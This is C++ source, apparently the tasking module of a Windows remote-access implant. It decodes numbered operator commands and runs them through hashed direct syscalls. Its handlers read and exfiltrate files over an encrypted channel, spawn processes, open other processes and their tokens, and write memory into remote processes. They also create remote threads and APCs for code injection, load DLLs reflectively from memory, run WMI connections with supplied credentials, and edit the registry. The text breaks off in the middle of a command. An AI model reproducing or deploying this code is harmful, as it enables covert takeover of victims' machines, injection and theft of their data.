#include <WS2tcpip.h>
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <cmd_handler.h>
#include <locale>
#include <codecvt>
#include <random>
#include <AES.h>
#include <cmd_parser.hpp>
#include <resp_builder.hpp>
#include <wmilib.hpp>
#include <config.h>
#include <token.h>
#include <inject.h>
#include <mem_ldr.h>
#include <syslib.hpp>
#include <hashtable.h>
#include <intstructs.h>
#include <cutils.h>
#include <syscall_gate.hpp>
#include <gdiscreen.hpp>
#include <extapi.h>
#include <iphlpapi.h>
#include <netutils.h>
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")


std::vector<UCHAR> virtual_path;
std::vector<PEXTENSION_OBJECT> extension_list;
bool vpath_initialized = false;
bool syscall_initialized = false;
bool timeout_initialized = false;
bool gsrwlock_initialized = false;
int g_timeout = 0;
//std::vector<RPROCESS> proc_list;
std::vector<PMEMORYMODULE> mapdll_list;
std::vector<WmiLib*> wmi_session;
SRWLOCK gSRWLock = { 0 };
syslib* psyslib = NULL;


HRESULT init_com() {
	HRESULT hRes = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_DELEGATE, NULL, EOAC_NONE, 0);
	if (hRes == CO_E_NOTINITIALIZED)
	{
		hRes = CoInitializeEx(NULL, COINIT_MULTITHREADED);
		if (FAILED(hRes))
			return hRes;

		if ((FAILED(hRes = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_DELEGATE, NULL, EOAC_NONE, 0))))
			return hRes;
	}
	return hRes;
}
extern std::wstring random_string(std::size_t length);
int dll_load_routine(CommandParser* _parser) {
	BOOL bResult = 0;
	CommandParser parser = *_parser;
	LONGLONG ptr = parser.get_long();
	LONG dll_size = parser.get_int();
	int noExport = parser.get_byte();
	int noWait = parser.get_byte();
	int byOrdinal = parser.get_byte();

//	MessageBoxA(0, 0, 0, 0);
	PMEMORYMODULE dll_descriptor = MemoryLoadLibrary((LPVOID)ptr, dll_size);
//	MessageBoxA(0, 0, 0, 0);
	if (noExport && dll_descriptor)
	{
		bResult = 1;
	}
	if (byOrdinal && !noExport)
	{
		int ordinal = parser.get_int();
		if (dll_descriptor->initialized)
		{

			FARPROC proc = MemoryGetProcAddress(dll_descriptor, ordinal);
			if (proc)
			{
				proc();
				bResult = 1;
				SetLastError(0);
			}
			if (!noWait)
			{
				MemoryFreeLibrary(dll_descriptor);
			}
		}
	}
	else if (!byOrdinal && !noExport)
	{
		int exportname_hash = parser.get_int();
		if (dll_descriptor->initialized)
		{
			FARPROC proc = MemoryGetProcAddress(dll_descriptor, exportname_hash);
			if (proc)
			{
//				char ap[256];
//				sprintf(ap, "base %p f %p h %p", dll_descriptor->codeBase, proc, exportname_hash);
//				MessageBoxA(0, ap, 0, 0);
				proc();
//				MessageBoxA(0, "postcall", 0, 0);
				bResult = 1;
				SetLastError(0);
			}
			if (!noWait)
			{	
//				MessageBoxA(0, "freeing",0 ,0);
				MemoryFreeLibrary(dll_descriptor);
			}
		}
	}
	if (!noWait)
	{
		//MessageBoxA(0, "freeing final", 0, 0);
		MemoryFreeLibrary(dll_descriptor);
	}
	return bResult;
}

__declspec(noinline) ULONG GetFile(PCHAR& dataBlob, HANDLE hFile)
{
	DWORD dwBytesReaded = 0;

	if (GetFileType(hFile) == FILE_TYPE_PIPE)
	{
		auto buffer = ReadFromPipe(hFile);

		dataBlob = new char[buffer.size()];
		_memcpy(dataBlob, (void*)buffer.data(), buffer.size());
		return buffer.size();
	}

	ULONG dataSz = GetFileSize(hFile, 0);

	dataBlob = new char[dataSz];
/*
	bErrorFlag = ReadFile(
		hFile,
		dataBlob,
		dataSz,
		&dwBytesReaded,
		NULL);
*/
	IO_STATUS_BLOCK io = { 0 };
	LARGE_INTEGER liBytes = { 0 };
	NTSTATUS status = psyslib->nt_call(HASH_NtReadFile, hFile, 0, 0, 0, &io, dataBlob, dataSz, &liBytes, 0);
	SetLastError(status);
	dwBytesReaded = io.Information;
	if (status != ERROR_SUCCESS) return -1;
	return dwBytesReaded;
}
__declspec(noinline) ULONG SaveFile(PUCHAR dataBlob, ULONG dataSz, HANDLE hFile)
{
	BOOL bErrorFlag = FALSE;
	DWORD dwBytesWritten = -1;

	if (GetFileType(hFile) == FILE_TYPE_PIPE)
	{
		dwBytesWritten = WriteToPipe(hFile, dataBlob, dataSz);

		return dwBytesWritten;
	}

	IO_STATUS_BLOCK io = { 0 };
	psyslib->nt_call(HASH_NtWriteFile, hFile, 0, 0, 0, &io, dataBlob, dataSz, 0, 0);
	dwBytesWritten = io.Information;
/*
	bErrorFlag = WriteFile(
		hFile,
		dataBlob,
		dataSz,
		&dwBytesWritten,
		NULL);
		*/
	return dwBytesWritten;
}

NTSTATUS handle_cmd(PMODULE_CONTEXT ctx) {
	SetLastError(0);
	psyslib = ctx->psyslib;
	init_com();
	if (!gsrwlock_initialized) {
		InitializeSRWLock(&gSRWLock);
		gsrwlock_initialized = true;
	}
	if (!vpath_initialized)
	{
		AES aes;
		wchar_t buffer[256] = { 0 };
		GetModuleFileNameW(0, (LPWSTR)buffer, sizeof(buffer));
		std::wstring::size_type pos = std::wstring(buffer).find_last_of(L"\\/");
		std::wstring ws = std::wstring(buffer).substr(0, pos);
		auto temp_vpath = std::vector<UCHAR>((UCHAR*)ws.data(), (UCHAR*)ws.data() + pos * sizeof(wchar_t));
		temp_vpath.push_back(0);
		temp_vpath.push_back(0);
		while (temp_vpath.size() % 16 != 0 || temp_vpath.size() == 0) {
			temp_vpath.resize(temp_vpath.size() + 1);
		}
		virtual_path = aes.EncryptCBC(temp_vpath, ctx->aes_key, ctx->iv);
		temp_vpath.~vector();
		vpath_initialized = true;
	}
	if (!timeout_initialized)
	{
		g_timeout = ctx->pconfig->timeout;
		timeout_initialized = true;
	}

	auto parser = new CommandParser();
	auto builder = new ResponseBuilder();
	parser->load_data(ctx->userdata);
	DWORD task_rid = parser->get_int();
	ctx->random_id = task_rid;
	//char a[256];
	//sprintf(a, "ptr %p hex %x dec %d", ctx->userdata.data(), ctx->random_id, ctx->random_id);
	//MessageBoxA(0, a, 0, 0);
	DWORD code = parser->get_command();

	if (code == 10) {
		std::string env = parser->get_strarg();
		DWORD env_length = GetEnvironmentVariableA(env.c_str(), 0, 0);
		LPSTR env_var = new char[env_length];
		bool bResult = GetEnvironmentVariableA(env.c_str(), env_var, env_length);
		PACK_GLE_STATUS
			if (bResult) builder->add_strarg(env_var);
		STANDART_EPILOGUE
	}
	if (code == 33) {
		std::string path = parser->get_strarg();
		DWORD access = parser->get_int() | SYNCHRONIZE;
		DWORD disposition = parser->get_int();
		DWORD attributes = parser->get_int();
		DWORD options = parser->get_int() | 0x00000020;
		IO_STATUS_BLOCK block;
		HANDLE hFile = 0;
		OBJECT_ATTRIBUTES oa;
		UNICODE_STRING unistr;

		unistr.Buffer = (wchar_t*)path.c_str();
		unistr.Length = path.size();
		unistr.MaximumLength = path.size();

		InitializeObjectAttributes(&oa, &unistr, 0x00000040, NULL, NULL);
		NTSTATUS status = psyslib->nt_call(HASH_NtCreateFile, &hFile, access, &oa, &block, NULL, attributes, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, disposition, options, NULL, NULL);
		//CreateFileA(path.c_str(), access, 0, 0, disposition, attributes, 0);
		bool bResult = 1;
		if (hFile == 0) bResult = 0;
		PACK_NTSTATUS_STATUS

			if (bResult) builder->add_int((DWORD)hFile);
		STANDART_EPILOGUE
	}
	if (code == 21) {
		HANDLE hFile = (HANDLE)parser->get_int();

		PCHAR file_buf = 0;
		ULONG file_size = GetFile(file_buf, hFile);

		bool bResult = 1;
		if (file_size == -1) bResult = 0;
		
		PACK_GLE_STATUS
		if (GetLastError() == 0) ctx->netio.send_encrypted_taskresponse_big(ctx, std::vector<UCHAR>(file_buf, file_buf + file_size), builder);
		delete[] file_buf;
	}
	if (code == 65)
	{
		HANDLE Handle = (HANDLE)parser->get_int();
		bool bResult = 0;
		NTSTATUS status = psyslib->nt_call_1arg(HASH_NtClose, Handle);
		HANDLE_SYSCALL_RESULT
		PACK_NTSTATUS_STATUS
			builder->add_int(bResult);
		STANDART_EPILOGUE
	}
	if (code == 87)
	{
		HANDLE hHeap = HeapCreate(0, 0, 0);
		BOOL bResult = 0;
		LONGLONG writtenBytes = 0;
		NTSTATUS status = ERROR_SUCCESS;
		if (hHeap != INVALID_HANDLE_VALUE)
		{
			HANDLE Handle = (HANDLE)parser->get_int();
			ULONGLONG fSize = parser->get_long();
			LPVOID buffer_ptr = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, fSize);
			if (buffer_ptr)
			{
				memcpy(buffer_ptr, parser->get_str(fSize).data(), fSize);
				writtenBytes = SaveFile((PUCHAR)buffer_ptr, fSize, Handle);
				status = GetLastError();
				if (status == ERROR_SUCCESS) bResult = 1;
				HeapFree(hHeap, 0, buffer_ptr);
			}
			HeapDestroy(hHeap);
		}
		PACK_NTSTATUS_STATUS
			builder->add_long(writtenBytes);
		STANDART_EPILOGUE
	}
	if (code == 99)
	{
		BOOL bResult = 0;
		HANDLE read, write;
		std::string proc = parser->get_strarg();
		std::string proc_args = parser->get_strarg();
		int flags = parser->get_int();
		auto struct_info_proc = run_process(proc + " " + proc_args, &read, &write, flags);
		if (struct_info_proc.hProcess)
		{
			bResult = 1;
		}

		PACK_GLE_STATUS
			if (struct_info_proc.hProcess)
			{
				builder->add_int(struct_info_proc.dwProcessId);
				builder->add_int(struct_info_proc.dwThreadId);
				builder->add_int((DWORD)struct_info_proc.hProcess);
				builder->add_int((DWORD)struct_info_proc.hThread);
				builder->add_int((DWORD)read);
				builder->add_int((DWORD)write);
			}
		STANDART_EPILOGUE
	}
	if (code == 135) {
		int val = parser->get_int();
		PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
		sp.MicrosoftSignedOnly = val;
		BOOL bResult = SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));
		PACK_GLE_STATUS
			builder->add_byte(bResult);
		STANDART_EPILOGUE
	}
	if (code == 201) {
		BOOL bResult = 0;
		int pid = parser->get_int();
		int access = parser->get_int();
		HANDLE hProcess = 0;
		OBJECT_ATTRIBUTES oa;
		CLIENT_ID cid = {(HANDLE)pid, 0};

		InitializeObjectAttributes(&oa, 0, 0, 0, 0);
		NTSTATUS status = psyslib->nt_call(HASH_NtOpenProcess, &hProcess, access, &oa, &cid);
		HANDLE_SYSCALL_RESULT
		PACK_NTSTATUS_STATUS
			builder->add_int((int)hProcess);
		STANDART_EPILOGUE
	}
	if (code == 79) {
		BOOL bResult = 0;
		int hProcess = parser->get_int();
		HANDLE hToken = 0;
		NTSTATUS status = 0;
		int access = parser->get_int();
		status = psyslib->nt_call_3arg(HASH_NtOpenProcessToken, (HANDLE)hProcess, (PVOID)access, &hToken);
		HANDLE_SYSCALL_RESULT
		PACK_NTSTATUS_STATUS
			builder->add_int((int)hToken);
		STANDART_EPILOGUE
	}
	if (code == 123)
	{
		BOOL bResult = 0;
		std::string s;
		int hToken = parser->get_int();
		int isUID = parser->get_int();
		if (!isUID) {
			s = TokenGetSID((HANDLE)hToken);
		}
		else{
			s = TokenGetUID((HANDLE)hToken);
		}
		if (s.size() > 0) bResult = 1;
		PACK_GLE_STATUS
			builder->add_strarg(s);
		STANDART_EPILOGUE
	}
	if (code == 210)
	{
		BOOL bResult = 0;
		int hProcess = parser->get_int();
		LONGLONG size = parser->get_long();
		int alloctype = parser->get_int();
		int protect = parser->get_int();
		LONGLONG ptr = 0;
		NTSTATUS status = 0;
		status = psyslib->nt_call(HASH_NtAllocateVirtualMemory, (HANDLE)hProcess, &ptr, NULL, &size, alloctype, protect);
		HANDLE_SYSCALL_RESULT
		PACK_NTSTATUS_STATUS
			builder->add_long(ptr);
		STANDART_EPILOGUE
	}
	if (code == 211)
	{

		BOOL bResult = 0;
		int hProcess = parser->get_int();
		LONGLONG addr = parser->get_long();
		LONGLONG size = parser->get_long();
		int freetype = parser->get_int();
		NTSTATUS status = 0;
		status = psyslib->nt_call(HASH_NtFreeVirtualMemory, (HANDLE)hProcess, (LPVOID)&addr, &size, freetype);
		HANDLE_SYSCALL_RESULT
		PACK_NTSTATUS_STATUS
			builder->add_byte(bResult);
		STANDART_EPILOGUE
	}
	if (code == 212)
	{
		BOOL bResult = 0;
		int hProcess = parser->get_int();
		LONGLONG addr = parser->get_long();
		LONGLONG size = parser->get_long();
		int protect = parser->get_int();
		DWORD old_protect = 0;
		NTSTATUS status = 0;

		status = psyslib->nt_call(HASH_NtProtectVirtualMemory, (HANDLE)hProcess, (LPVOID)&addr, &size, protect, (PDWORD)&old_protect);
		HANDLE_SYSCALL_RESULT

		PACK_NTSTATUS_STATUS
			builder->add_int(old_protect);
		STANDART_EPILOGUE
	}
	if (code == 189) {
		HANDLE hHeap = HeapCreate(0, 0, 0);
		BOOL bResult = 0;
		LONGLONG writtenBytes = 0;
		NTSTATUS status = ERROR_SUCCESS;
		if (hHeap != INVALID_HANDLE_VALUE)
		{
			int Handle = parser->get_int();
			ULONGLONG ptr = parser->get_long();
			ULONGLONG mSize = parser->get_long();
			LPVOID buffer_ptr = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, mSize);
			NTSTATUS status = 0;
			if (buffer_ptr)
			{
				memcpy(buffer_ptr, parser->get_str(mSize).data(), mSize);
				if ((HANDLE)Handle == (HANDLE)(-1))
				{
					memcpy((LPVOID)ptr, (LPVOID)buffer_ptr, mSize);
					bResult = 1;
					writtenBytes = mSize;
				}
				else {
					status = psyslib->nt_call(HASH_NtWriteVirtualMemory, (HANDLE)Handle, (LPVOID)ptr, buffer_ptr, mSize, (PSIZE_T)&writtenBytes);
					HANDLE_SYSCALL_RESULT
				}
				HeapFree(hHeap, 0, buffer_ptr);
			}
			HeapDestroy(hHeap);
		}
		PACK_NTSTATUS_STATUS
			builder->add_long(writtenBytes);
		STANDART_EPILOGUE
	}
	if (code == 190){
		BOOL bResult = 0;
		int hProcess = parser->get_int();
		LONGLONG addr = parser->get_long();
		LONGLONG size = parser->get_long();
		LONGLONG readed = 0;
		NTSTATUS status = 0;
		PCHAR buffer_ptr = new char[size];
		if ((HANDLE)hProcess == ((HANDLE)-1)) {
			memcpy(buffer_ptr, (LPVOID)addr, size);
			bResult = 1;
			readed = size;
		}
		else {
			status = psyslib->nt_call(HASH_NtReadVirtualMemory, (HANDLE)hProcess, (LPVOID)addr, buffer_ptr, size, (PSIZE_T)&readed);
			HANDLE_SYSCALL_RESULT
		}

		PACK_NTSTATUS_STATUS

			ctx->netio.send_encrypted_taskresponse_big(ctx, std::vector<UCHAR>(buffer_ptr, buffer_ptr + readed), builder);
		delete[] buffer_ptr;
	}
	if (code == 176)
	{
		BOOL bResult = 0;
		int hProcess = parser->get_int();
		LONGLONG size = parser->get_long();
		int secprotect = parser->get_int();
		int pageprotect = parser->get_int();
		int secattr = parser->get_int();
		PSECTION_ALLOC lpSectionAlloc = SectionAlloc((HANDLE)hProcess, size, secprotect, pageprotect, secattr);
		if (lpSectionAlloc)
		{
			bResult = 1;
		}
		PACK_GLE_STATUS
			if (lpSectionAlloc)
			{
				builder->add_long(lpSectionAlloc->localSection);
				builder->add_long(lpSectionAlloc->remoteSection);
			}
		STANDART_EPILOGUE
	}
	if (code == 224)
	{
		DWORD tid = 0;
		BOOL bResult = 0;
		HANDLE hThread = 0;
		NTSTATUS status = 0;
		int hProcess = parser->get_int();
		LONGLONG addr = parser->get_long();
		LONGLONG param = parser->get_long();
		int flags = parser->get_int();
		
		CLIENT_ID cid;
		PS_ATTRIBUTE_LIST lst;
		lst.TotalLength = offsetof(PS_ATTRIBUTE_LIST, Attributes[1]);
		lst.Attributes[0].Attribute = 0x10003;
		lst.Attributes[0].Size = sizeof(cid);
		lst.Attributes[0].ValuePtr = &cid;
		lst.Attributes[0].ReturnLength = NULL;

		status = psyslib->nt_call(HASH_NtCreateThreadEx, &hThread, 0x1FFFFF, NULL, hProcess, (PVOID)addr, (LPVOID)param, flags, 0, 0, 0, &lst);
		if (NT_SUCCESS(status))
		{
			bResult = 1;
			tid = (DWORD)cid.UniqueThread;
		}


		PACK_NTSTATUS_STATUS
			builder->add_int((int)hThread);
		builder->add_int(tid);
		STANDART_EPILOGUE
	}
	if (code == 172)
	{
		BOOL bResult = 0;
		int hProcess = parser->get_int();
		LONGLONG addr = parser->get_long();
		LONGLONG param = parser->get_int();

		bResult = ProcessStartApcRoutine((HANDLE)hProcess, (LPVOID)addr, (LPVOID)param);

		PACK_GLE_STATUS
			builder->add_byte(bResult);
		STANDART_EPILOGUE
	}
	if (code == 228)
	{
		BOOL bResult = 0;
		WmiLib* swmi = new WmiLib;
		NTSTATUS status = swmi->InitializeWmi();
		AcquireSRWLockExclusive(&gSRWLock);
		wmi_session.push_back(swmi);
		ReleaseSRWLockExclusive(&gSRWLock);
		if (SUCCEEDED(status))
		{
			bResult = 1;
		}
		PACK_NTSTATUS_STATUS
			AcquireSRWLockShared(&gSRWLock);
			builder->add_byte(wmi_session.size() - 1);
			ReleaseSRWLockShared(&gSRWLock);
		STANDART_EPILOGUE
	}
	if (code == 229)
	{
		BOOL bResult = 0;
		NTSTATUS status = 0;
		int wmi_id = parser->get_int();
		auto resource = parser->get_strarg();
		auto user = parser->get_strarg();
		auto passwd = parser->get_strarg();
		auto authority = parser->get_strarg();

		PWCHAR w_user = (PWCHAR)user.c_str();
		if (user.length() == NULL) w_user = NULL;
		PWCHAR w_passwd = (PWCHAR)passwd.c_str();
		if (passwd.length() == NULL) w_passwd = NULL;
		PWCHAR w_authority = (PWCHAR)authority.c_str();
		if (authority.length() == NULL) w_authority = NULL;
		AcquireSRWLockExclusive(&gSRWLock);
		if (wmi_session.size() <= wmi_id || wmi_session.at(wmi_id)->released)
		{
			status = ERROR_INVALID_OPERATION;
		}
		else
		{
			status = wmi_session.at(wmi_id)->ConnectServer((PWCHAR)resource.c_str(), (PWCHAR)w_user, (PWCHAR)w_passwd, (PWCHAR)w_authority);
			if (SUCCEEDED(status))
			{
				bResult = 1;
			}
		}
		ReleaseSRWLockExclusive(&gSRWLock);
		PACK_NTSTATUS_STATUS
			builder->add_byte(bResult);
		STANDART_EPILOGUE
	}
	if (code == 230)
	{
		NTSTATUS status = 0;
		BOOL bResult = 0;
		int wmi_id = parser->get_int();
		auto query = parser->get_strarg();
		AcquireSRWLockExclusive(&gSRWLock);
		if (wmi_session.size() <= wmi_id || wmi_session.at(wmi_id)->released)
		{
			status = ERROR_INVALID_OPERATION;
		}
		else
		{
			status = wmi_session.at(wmi_id)->ExecuteQuery((PWCHAR)query.c_str());
			if (SUCCEEDED(status))
			{
				bResult = 1;
			}
		}

		ReleaseSRWLockExclusive(&gSRWLock);
		PACK_NTSTATUS_STATUS
			builder->add_byte(bResult);
		STANDART_EPILOGUE
	}
	if (code == 234)
	{
		NTSTATUS status = 0;
		BOOL bResult = 0;
		int wmi_id = parser->get_int();
		auto wmiclass = parser->get_strarg();
		auto wmimethod = parser->get_strarg();
		AcquireSRWLockExclusive(&gSRWLock);
		if (wmi_session.size() <= wmi_id || wmi_session.at(wmi_id)->released)
		{
			status = ERROR_INVALID_OPERATION;
		}
		else
		{
			status = wmi_session.at(wmi_id)->CallMethod((PWCHAR)wmiclass.c_str(), (PWCHAR)wmimethod.c_str());
			if (SUCCEEDED(status))
			{
				bResult = 1;
			}
		}
		ReleaseSRWLockExclusive(&gSRWLock);

		PACK_NTSTATUS_STATUS
			builder->add_byte(bResult);
		STANDART_EPILOGUE
	}
	if (code == 231)
	{
		BOOL bResult = 0;
		NTSTATUS status = 0;
		int wmi_id = parser->get_int();
		AcquireSRWLockExclusive(&gSRWLock);
		if (wmi_session.size() <= wmi_id || wmi_session.at(wmi_id)->released)
		{
			status = ERROR_INVALID_OPERATION;
		}
		else
		{
			wmi_session.at(wmi_id)->ReleaseWmi();
			bResult = 1;
		}
		ReleaseSRWLockExclusive(&gSRWLock);
		PACK_NTSTATUS_STATUS
			builder->add_byte(bResult);
		STANDART_EPILOGUE
	}
	if (code == 232)
	{
		BOOL bResult = 0;
		int wmi_id = parser->get_int();
		int flt_cnt = parser->get_int();
		std::vector<PWCHAR> flt;
		std::vector<UCHAR> packed_result;
		DWORD row_cnt = 0;
		AcquireSRWLockExclusive(&gSRWLock);
		if (wmi_session.size() <= wmi_id || wmi_session.at(wmi_id)->released)
		{
			SetLastError(ERROR_INVALID_OPERATION);
		}
		else
		{
			for (int i = 0; i < flt_cnt; i++)
			{
				std::string str_flt = parser->get_strarg();
				PWCHAR _str_flt = new wchar_t[str_flt.size()];
				_memcpy(_str_flt, (void*)str_flt.data(), str_flt.size());
				flt.push_back(_str_flt);
			}
			packed_result = wmi_session.at(wmi_id)->PackResult(flt, &row_cnt);
			if (NT_SUCCESS(GetLastError()))
			{
				bResult = 1;
			}
		}
		ReleaseSRWLockExclusive(&gSRWLock);

		PACK_GLE_STATUS

			builder->add_int(row_cnt);
		builder->add_bstrarg((char*)packed_result.data(), packed_result.size());

		STANDART_EPILOGUE
			flt.~vector();
	}
	if (code == 233)
	{
		BOOL bResult = 0;
		int wmi_id = parser->get_int();
		int flt_cnt = parser->get_int();
		std::vector<PWCHAR> flt;
		std::vector<UCHAR> packed_result;
		DWORD row_cnt = 0;
		AcquireSRWLockExclusive(&gSRWLock);
		if (wmi_session.size() <= wmi_id || wmi_session.at(wmi_id)->released)
		{
			SetLastError(ERROR_INVALID_OPERATION);
		}
		else
		{
			for (int i = 0; i < flt_cnt; i++)
			{
				std::string str_flt = parser->get_strarg();
				PWCHAR _str_flt = new wchar_t[str_flt.size()];
				_memcpy(_str_flt, (void*)str_flt.data(), str_flt.size());
				flt.push_back(_str_flt);
			}
			packed_result = wmi_session.at(wmi_id)->PackMethodResult(flt, &row_cnt);
			if (NT_SUCCESS(GetLastError()))
			{
				bResult = 1;
			}
		}
		ReleaseSRWLockExclusive(&gSRWLock);

		PACK_GLE_STATUS

			builder->add_int(row_cnt);
		builder->add_bstrarg((char*)packed_result.data(), packed_result.size());

		STANDART_EPILOGUE
			flt.~vector();
	}
	if (code == 163)
	{
		AES aes;
		BOOL bResult = 1;
		PACK_GLE_STATUS
			AcquireSRWLockShared(&gSRWLock);
			std::vector<UCHAR> decrypted_vdir = aes.DecryptCBC(virtual_path, ctx->aes_key, ctx->iv);
			builder->add_bstrarg((CHAR*)decrypted_vdir.data(), _wcslen((WCHAR*)decrypted_vdir.data())*2);
			ReleaseSRWLockShared(&gSRWLock);
		STANDART_EPILOGUE
	}
	if (code == 164)
	{
		AES aes;
		BOOL bResult = 0;
		std::string new_vpath = parser->get_strarg();
		DWORD dwAttr = GetFileAttributesW((wchar_t*)new_vpath.c_str());
		AcquireSRWLockShared(&gSRWLock);
		if (dwAttr != INVALID_FILE_ATTRIBUTES) {
			if ((dwAttr & FILE_ATTRIBUTE_DIRECTORY))
			{
				bResult = 1;
				virtual_path = aes.EncryptCBC(std::vector<UCHAR>(new_vpath.begin(), new_vpath.end()), ctx->aes_key, ctx->iv);
			}
			else
			{
				SetLastError(INVALID_FILE_ATTRIBUTES);
			}
		}
		else
		{
			SetLastError(dwAttr);
		}
		ReleaseSRWLockShared(&gSRWLock);
		PACK_GLE_STATUS
			builder->add_byte(bResult);
		STANDART_EPILOGUE
	}
	if (code == 98)
	{
		BOOL bResult = 0;
		BOOL detached = parser->get_byte();

		if (detached)
		{
			//CreateThread(0, 0, (LPTHREAD_START_ROUTINE)dll_load_routine, &parser, 0, 0);
			CLIENT_ID cid;
			HANDLE hThread;
			NTSTATUS status = psyslib->nt_call(HASH_NtCreateThreadEx, &hThread, 0x1FFFFF, NULL, (HANDLE)(-1), (PVOID)dll_load_routine, &parser, 0, 0, 0, 0, 0); //THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
			SetLastError(status);
			HANDLE_SYSCALL_RESULT
		}
		else {
			bResult = dll_load_routine(parser);
		}

		PACK_GLE_STATUS
			builder->add_byte(bResult);

		STANDART_EPILOGUE
	}
	if (code == 249)
	{
		BOOL bResult = 0;
		HKEY key = 0;
		DWORD pseudoKey = parser->get_int();
		std::string wsubkey = parser->get_strarg();
		DWORD access = parser->get_int();
		LSTATUS status = RegOpenKeyExW((HKEY)pseudoKey, (LPWSTR)wsubkey.data(), 0, access, &key);
		if (status == ERROR_SUCCESS) {
			bResult = 1;
		}

		PACK_NTSTATUS_STATUS
			builder->add_int((DWORD)key);

		STANDART_EPILOGUE
	}
	if (code == 250)
	{
		BOOL bResult = 0;
		HKEY key = 0;
		DWORD pseudoKey = parser->get_int();
		std::string wsubkey = parser->get_strarg();
		DWORD access = parser->get_int();
		LSTATUS status = RegCreateKeyExW((HKEY)pseudoKey, (LPWSTR)wsubkey.data(), 0, 0, REG_OPTION_NON_VOLATILE, access, 0, &key, 0);
		if (status == ERROR_SUCCESS) {
			bResult = 1;
		}

		PACK_NTSTATUS_STATUS
			builder->add_int((DWORD)key);
		STANDART_EPILOGUE
	}
	if (code == 251)
	{
		BOOL bResult = 0;
		PBYTE outbuf = 0;
		DWORD type = 0;
		DWORD data_sz = 0;
		DWORD pseudoKey = parser->get_int();
		std::string wsubkey = parser->get_strarg();

		LSTATUS status = RegQueryValueExW((HKEY)pseudoKey, (LPWSTR)wsubkey.data(), 0, 0, 0, &data_sz);
		if (data_sz != 0) {
			outbuf = new unsigned char[data_sz];
			status = RegQueryValueExW((HKEY)pseudoKey, (LPWSTR)wsubkey.data(), 0, &type, outbuf, &data_sz);
			if (status == ERROR_SUCCESS) {
				bResult = 1;
			}
		}

		PACK_NTSTATUS_STATUS
			builder->add_int((DWORD)type);
		builder->add_int((DWORD)data_sz);
		builder->add_bstrarg((PCHAR)outbuf, data_sz);

		STANDART_EPILOGUE
	}
	if (code == 252)
	{
#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

		BOOL bResult = 0;
		DWORD cSubKeys = 0;
		DWORD cValues = 0;
		DWORD pseudoKey = parser->get_int();
		DWORD action_type = parser->get_byte();

		LSTATUS status = RegQueryInfoKeyW(
			(HKEY)pseudoKey,                    // key handle 
			0,
			0,
			NULL,                    // reserved 
			&cSubKeys,               // number of subkeys 
			0,
			0,
			&cValues,                // number of values for this key 
			0,
			0,
			0,
			0);
		PWCHAR keyName = new wchar_t[MAX_KEY_LENGTH];
		PWCHAR valueName = new wchar_t[MAX_VALUE_NAME];
		std::vector<std::wstring> multi_str;

		if (action_type == 0x1) {
			for (int i = 0; i < cSubKeys; i++)
			{
				DWORD maxLen = MAX_KEY_LENGTH;
				status = RegEnumKeyExW((HKEY)pseudoKey, i, keyName, &maxLen, NULL, NULL, NULL, NULL);
				multi_str.push_back(keyName);
			}
		}
		else {
			for (int i = 0; i < cValues; i++)
			{
				DWORD maxLen = MAX_VALUE_NAME;
				valueName[0] = 0;
				status = RegEnumValueW((HKEY)pseudoKey, i, valueName, &maxLen, NULL, NULL, NULL, NULL);
				multi_str.push_back(valueName);
			}
		}
		if (status == ERROR_SUCCESS)
		{
			bResult = 1;
		}
		PACK_NTSTATUS_STATUS
			builder->add_int(multi_str.size());

		for (std::wstring _str : multi_str) {
			builder->add_bstrarg((PCHAR)_str.data(), _str.size() * 2);
		}

		STANDART_EPILOGUE
	}
	if (code == 253)
	{
		BOOL bResult = 0;
		DWORD pseudoKey = parser->get_int();
		LSTATUS status = RegCloseKey((HKEY)pseudoKey);
		if (status == ERROR_SUCCESS) {
			bResult = 1;
		}

		PACK_NTSTATUS_STATUS
			builder->add_int(bResult);

		STANDART_EPILOGUE
	}
	if (code == 248)
	{
		BOOL bResult = 0;
		DWORD pseudoKey = parser->get_int();
		std::string wvalue_name = parser->get_strarg();
		DWORD value_type = parser->get_int();
		std::string value_data = parser->get_strarg();

		LSTATUS status = RegSetValueExW((HKEY)pseudoKey, (PWCHAR)wvalue_name.data(), 0, value_type, (const BYTE*)value_data.data(), value_data.size());
		if (status == ERROR_SUCCESS) {
			bResult = 1;
		}

		PACK_NTSTATUS_STATUS
			builder->add_int(bResult);

		STANDART_EPILOGUE
	}

	if (code == 247)
	{
		BOOL bResult = 0;
		DWORD pseudoKey = parser->get_int();

		LSTATUS status = 0;
		std::string wname = parser->get_strarg();
		DWORD delete_type = parser->get_int();
		if (delete_type == 1)
		{
			status = RegDeleteKeyExW((HKEY)pseudoKey, (PWCHAR)wname.data(), parser->get_int(), 0);
		}
		else {
			status = RegDeleteValueW((HKEY)pseudoKey, (PWCHAR)wname.data());
		}
		if (status == ERROR_SUCCESS) {
			bResult = 1;
		}

		PACK_NTSTATUS_STATUS
			builder->add_int(bResult);

		STANDART_EPILOGUE
	}
	if (code == 77)
	{
		BOOL bResult = 0;
		LONGLONG ptr = 0;
		DWORD offset = parser->get_int();
		DWORD size = parser->get_int();

#ifdef  _WIN64
		if (size == 1)
		{
			ptr = __readgsbyte(offset);
		}
		else if (size == 2)
		{
			ptr = __readgsword(offset);
		}
		else if (size == 4)
		{
			ptr = __readgsdword(offset);
		}
		else if (size == 8)
		{
			ptr = __readgsqword(offset);
		}
#else
		if (size == 1)
		{
			ptr = __readfsbyte(offset);
		}
		else if (size == 2)
		{
			ptr = __readfsword(offset);
		}
		else if (size == 4)
		{
			ptr = __readfsdword(offset);
		}
#endif

		if (ptr) bResult = 1;

		builder->add_byte(bResult);
		builder->add_int(ERROR_SUCCESS);
		builder->add_long(ptr);
		STANDART_EPILOGUE
	}
	if (code == 95)
	{
		BOOL bResult = 0;
		LONGLONG dll_ptr = parser->get_long();
		DWORD dll_size = parser->get_int();
